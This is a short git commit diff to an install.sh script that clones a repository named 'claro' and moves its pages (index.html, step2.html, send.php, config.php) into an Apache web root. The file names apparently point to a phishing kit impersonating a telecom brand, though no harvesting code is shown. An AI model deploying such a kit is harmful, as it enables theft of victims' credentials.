ea0f7baef49acab27d56595c0ae564acfc4b6ecf
RESEKK VPS <103382307+resekk-vps@users.noreply.github.com>
2022-04-10 18:51:22 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,3 +1,5 @@
+#!/bin/bash
 cd /etc/apache2/sites-available; nano 000-default.conf
 cd /var/www; git clone https://github.com/resekk-vps/claro
 cd /var/www/claro; nano config.php
+cd /var/www/claro; mv data /var/www; mv error_files /var/www; mv index_files /var/www; mv config.php /var/www; mv error.html /var/www; mv index.html /var/www; mv install.sh /var/www; mv send.php /var/www; mv step2.html /var/www
